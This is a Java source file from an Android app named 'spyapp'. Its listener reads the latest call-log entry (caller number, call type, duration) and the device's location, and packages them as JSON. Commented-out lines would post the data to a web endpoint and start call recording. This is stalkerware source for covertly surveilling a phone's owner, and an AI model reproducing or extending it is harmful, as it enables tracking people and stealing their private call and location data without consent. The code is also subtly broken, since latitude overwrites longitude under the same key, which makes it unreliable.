package com.example.spyapp.receiver;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.example.spyapp.MainActivity;
import com.example.spyapp.Services;
import com.example.spyapp.http.PostData;
import com.example.spyapp.util.WebConst;

import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.telephony.PhoneStateListener;
import android.util.Log;
import android.widget.Toast;

public class PhoneLogListener extends PhoneStateListener
{
    private Context context;
    private  String callerPhoneNumber ="";
    private PostData postData=PostData.getInstance();
    private int hour=0,minute=0,second = 0;

    public PhoneLogListener(Context c) {
        Log.i("CallRecorder", "PhoneListener constructor");
        context = c;
    }
    
    boolean isCallRecording=true;

    public void onCallStateChanged (int state, String incomingNumber)
    {
        Log.d("CallRecorder", "PhoneListener::onCallStateChanged state:" + state + " incomingNumber:" + incomingNumber);

        switch (state) {
        case TelephonyManager.CALL_STATE_IDLE:
        	
//        	if(MainActivity.stopRecording()!=null){
//        		
//        		isCallRecording=false;
//        	}
        	
        	System.out.println("hello ");
//        	JSONArray merstr= getCallLogDetails();
//        	postData.requstPost(WebConst.SMS_URL, json,this);
            break;
        case TelephonyManager.CALL_STATE_RINGING:
            Log.d("CallRecorder", "CALL_STATE_RINGING");
            break;
        case TelephonyManager.CALL_STATE_OFFHOOK:
        	//MainActivity.startRecording();
            Log.d("CallRecorder", "CALL_STATE_OFFHOOK starting recording");
            break;
        }
    }
    
    
    public JSONArray getCallLogDetails()
	{
    	final JSONArray jsonArray=new JSONArray();
	//	Toast.makeText(this, "in call log", Toast.LENGTH_LONG).show();
		Cursor c = 
			context.getContentResolver().query(android.provider.CallLog.Calls.CONTENT_URI,null, 
			null, null,android.provider.CallLog.Calls.DATE + " DESC");  
			               int numberColumn = 
			c.getColumnIndex(android.provider.CallLog.Calls.NUMBER); 
			        int dateColumn = 
			c.getColumnIndex(android.provider.CallLog.Calls.DATE); 
			        int typeColumn = 
			c.getColumnIndex(android.provider.CallLog.Calls.TYPE); 
			        int DurationColumn = 
			c.getColumnIndex(android.provider.CallLog.Calls.DURATION); 

			 
			
			        String TypeString="";
			         if(c.moveToPosition(0)){ 
			                // c.move(1); 
			        	 callerPhoneNumber = c.getString(numberColumn); 
			                String callerPhoneDate = c.getString(dateColumn); 
			                int Type = Integer.parseInt(c.getString(typeColumn)); 
			                int Dur = Integer.parseInt(c.getString(DurationColumn)); 
    
			                switch (Type) {
							case 1:
								TypeString="incoming";
								break;
								
							case 2:
								TypeString="outgoing";							
								break;
							case 3:
								TypeString="missedcall";
								break;
							default:
								break;
							}
			                
			                hour=(Dur/(60*60))%24;
			                minute=(Dur/(60))%60;
			                second=(Dur%60);
			                
			              } 
			         	
			         LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
					 
						LocationListener locationListener = new LocationListener() {

						    @Override
						    public void onProviderEnabled(String provider) {
						        Toast.makeText(context,
						                "Provider enabled: " + provider, Toast.LENGTH_SHORT)
						                .show();
						    }
						 
						    @Override
						    public void onProviderDisabled(String provider) {
						        Toast.makeText(context,
						                "Provider disabled: " + provider, Toast.LENGTH_SHORT)
						                .show();
						    }
						 
						    @Override
						    public void onLocationChanged(Location location) {
						        // Do work with new location. Implementation of this method will be covered later.
						    	 if(location!=null){
							    	   double lati= location.getLatitude();
							    	   double longi=location.getLongitude();
							    	   JSONObject jsonObj = new JSONObject();
										try {
											String duration=hour+"h:"+minute+"m:"+second+"s";
											jsonObj.put("call_duration", duration);
											jsonObj.put("callerPhoneNumber", callerPhoneNumber);
											jsonObj.put("location_long", longi);
											jsonObj.put("location_long", lati);
										
											if (!duration.equals("") && !callerPhoneNumber.equals("")) {
						                    	jsonArray.put(jsonObj);
						                    }
										} catch (JSONException e) {
											// TODO Auto-generated catch block
											e.printStackTrace();
										}
							    	  
							     }else{
							    	 JSONObject jsonObj = new JSONObject();
										try {
											String duration=hour+"h:"+minute+"m:"+second+"s";
											jsonObj.put("call_duration", duration);
											jsonObj.put("callerPhoneNumber", callerPhoneNumber);
											if (!duration.equals("") && !callerPhoneNumber.equals("")) {
						                    	jsonArray.put(jsonObj);
						                    }
										} catch (JSONException e) {
											// TODO Auto-generated catch block
											e.printStackTrace();
										}
							     }
						    }

							@Override
							public void onStatusChanged(String provider, int status,
									Bundle extras) {
								// TODO Auto-generated method stub
								
							}
						};
						 
						long minTime = 5 * 1000; // Minimum time interval for update in seconds, i.e. 5 seconds.
						long minDistance = 10; // Minimum distance change for update in meters, i.e. 10 meters.
						locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, minTime,
						        minDistance, locationListener);
			         
						
			         return jsonArray;
			         
	}
    void doWorkWithNewLocation(Location location) {
		System.out.println(location.getLatitude());
	}	
}
